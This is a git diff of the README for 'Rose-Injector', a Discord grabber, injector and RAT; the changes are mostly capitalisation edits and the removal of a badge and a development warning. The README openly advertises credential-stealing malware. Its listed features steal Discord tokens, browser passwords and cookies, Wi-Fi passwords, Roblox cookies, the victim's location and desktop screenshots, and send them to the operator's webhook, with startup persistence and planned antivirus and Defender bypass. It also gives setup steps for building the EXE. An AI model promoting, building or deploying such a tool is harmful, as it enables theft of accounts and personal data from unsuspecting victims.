@@ -6,7 +6,6 @@
   <br>
 </h1>
 <div align="center">
-    <a href="https://deepsource.io/gh/DamagingRose/Rose-Injector/?ref=repository-badge" target="_blank"><img alt="DeepSource" title="DeepSource" src="https://deepsource.io/gh/DamagingRose/Rose-Injector.svg/?label=resolved+issues&amp;show_trend=true&amp;token=bRGn0dU76xkJxQgniOJnrc7a"/></a>
     <br>
     <img src="https://img.shields.io/github/languages/top/DamagingRose/Rose-Injector?color=%23000000">
     <img src="https://img.shields.io/github/stars/DamagingRose/Rose-Injector?color=%23000000&amp;logoColor=%23000000">
@@ -22,7 +21,7 @@
 <div align="center">
     <br>
     <h1>
-        The best Discord Grabber, Injector, and RAT
+        The Best Discord Grabber, Injector, and RAT.
     </h1>
 </div>
 
@@ -39,28 +38,26 @@
 
 ## Description
 
-Rose is a powerful multipurpose grabber, injector & includes a [RAT](https://github.com/DamagingRose/Rose-RAT).
+Rose is a powerful multipurpose grabber, injector, and includes a [RAT](https://github.com/DamagingRose/Rose-RAT).
 
 ## Features
 
-- Logs Discord Token and Discord Account Info
-- Logs PC Info and IP
-- Logs Browser Passwords
-- Logs Browser Cookies
-- Logs WiFi Names and WiFi Passwords
-- Logs Roblox Account Data and Login Cookie
-- Sends you the Victim's Location and Desktop Screenshot
-- Start Up integration
-- JavaScript Injector: Discord Passwords, Names, Emails, Phone Numbers, successfully purchased Nitro Codes will be sent to your Webhook
+- Logs Discord token and Discord account info
+- Logs PC info and IP
+- Logs browser passwords
+- Logs browser cookies
+- Logs Wi-Fi names and Wi-Fi passwords
+- Logs Roblox account data and login cookie
+- Sends you the victim's location and desktop screenshot
+- Startup integration
+- JavaScript injector: Discord passwords, names, emails, phone numbers, successfully purchased Nitro Codes will be sent to your webhook
 - Discord RAT
-- UI Integration
-- Compiler that creates an EXE File for you
-- VirusTotal/VM Bypass/Blacklist - WIP
-- Bypass/Disable Windows Defender/Firewalls - WIP
+- UI integration
+- Compiler that creates an EXE file for you
+- VirusTotal/VM bypass/blacklist - WIP
+- Bypass/disable Windows Defender/Firewalls - WIP
 
 ### Setup
-
-Don't forget that the project is still under development release and might contain bugs.
 
 - [Download the repository](https://github.com/DamagingRose/Rose-Injector/archive/refs/heads/main.zip)
 - Run the `builder.bat` to open up the Rose builder/Python installer.
